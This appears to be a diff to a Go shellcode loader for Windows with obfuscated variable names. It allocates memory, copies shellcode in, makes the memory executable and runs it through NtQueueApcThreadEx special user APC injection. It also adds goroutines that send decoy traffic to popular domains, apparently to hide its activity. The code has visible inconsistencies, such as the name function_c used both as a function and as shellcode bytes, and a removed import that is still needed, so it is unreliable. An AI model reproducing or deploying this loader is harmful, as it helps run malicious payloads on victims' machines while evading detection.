@@ -1,13 +1,11 @@
 package main
 
 import (
-	"encoding/hex"
 	"flag"
 	"fmt"
 	"log"
 	"math/rand"
-	"sync"
-	"time"
+	"syscall"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -51,7 +49,7 @@ func main() {
 	if *variable_b {
 		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode...")
 	}
-	variable_k, variable_l, variable_m := variable_f.Call(0, uintptr(len(function_c)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+	variable_k, _, variable_m := variable_f.Call(0, uintptr(len(function_c)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 
 	if variable_m != nil && variable_m.Error() != "The operation completed successfully." {
 		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", variable_m.Error()))
@@ -68,7 +66,7 @@ func main() {
 	if *variable_b {
 		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory...")
 	}
-	variable_n, variable_o, variable_p := variable_i.Call(variable_k, (uintptr)(unsafe.Pointer(&function_c[0])), uintptr(len(function_c)))
+	_, _, variable_p := variable_i.Call(variable_k, uintptr(unsafe.Pointer(&function_c[0])), uintptr(len(function_c)))
 
 	if variable_p != nil && variable_p.Error() != "The operation completed successfully." {
 		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", variable_p.Error()))
@@ -82,8 +80,8 @@ func main() {
 		fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ...")
 	}
 	variable_q := PAGE_READWRITE
-	variable_r, variable_s, variable_t := variable_g.Call(variable_k, uintptr(len(function_c)), PAGE_EXECUTE, uintptr(unsafe.Pointer(&variable_q)))
-	if variable_t!= nil && variable_t.Error() != "The operation completed successfully." {
+	_, _, variable_t := variable_g.Call(variable_k, uintptr(len(function_c)), PAGE_EXECUTE, uintptr(unsafe.Pointer(&variable_q)))
+	if variable_t != nil && variable_t.Error() != "The operation completed successfully." {
 		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", variable_t.Error()))
 	}
 
@@ -94,7 +92,7 @@ func main() {
 	if *variable_b {
 		fmt.Println("[DEBUG]Calling GetCurrentThread...")
 	}
-	variable_u, variable_v, variable_w := variable_h.Call()
+	variable_u, _, variable_w := variable_h.Call()
 	if variable_w.Error() != "The operation completed successfully." {
 		log.Fatal(fmt.Sprintf("Error calling GetCurrentThread:\n%s", variable_w))
 	}
@@ -106,7 +104,7 @@ func main() {
 	if *variable_b {
 		fmt.Println("[DEBUG]Calling NtQueueApcThreadEx...")
 	}
-	variable_x, variable_y, variable_z := variable_j.Call(variable_u, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, uintptr(variable_k), 0, 0, 0)
+	_, _, variable_z := variable_j.Call(variable_u, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, uintptr(variable_k), 0, 0, 0)
 	if variable_z.Error() != "The operation completed successfully." {
 		log.Fatal(fmt.Sprintf("Error calling NtQueueApcThreadEx:\n%s", variable_z))
 	}
@@ -135,21 +133,22 @@ func function_b() {
 func function_c() {
 	rand.Seed(time.Now().UnixNano())
 	for i := 0; i < rand.Intn(4)+1; i++ {
+		// 异步处理网络请求
+		go func() {
+			ticker := time.NewTicker(5 * time.Minute)
+			defer ticker.Stop()
+			for range ticker.C {
+				variable_a := []string{"google.com", "facebook.com", "youtube.com"} // Alexa Top 100 中的域名
+				rand.Seed(time.Now().UnixNano())
+				variable_b := rand.Intn(len(variable_a))
+				variable_c := variable_a[variable_b]
+				url := "https://" + variable_c
+				// 发送HTTPS GET请求
+				// 这里省略了实际的HTTP请求代码
+				fmt.Println(url)
+			}
+		}()
 	}
-	// 异步处理网络请求
-	go func() {
-		ticker := time.NewTicker(5 * time.Minute)
-		defer ticker.Stop()
-		for range ticker.C {
-			variable_a := []string{"google.com", "facebook.com", "youtube.com"} // Alexa Top 100 中的域名
-			rand.Seed(time.Now().UnixNano())
-			variable_b := rand.Intn(len(variable_a))
-			variable_c := variable_a[variable_b]
-			url := "https://" + variable_c
-			// 发送HTTPS GET请求
-			// 这里省略了实际的HTTP请求代码
-		}
-	}()
 }
 
 func function_d() {
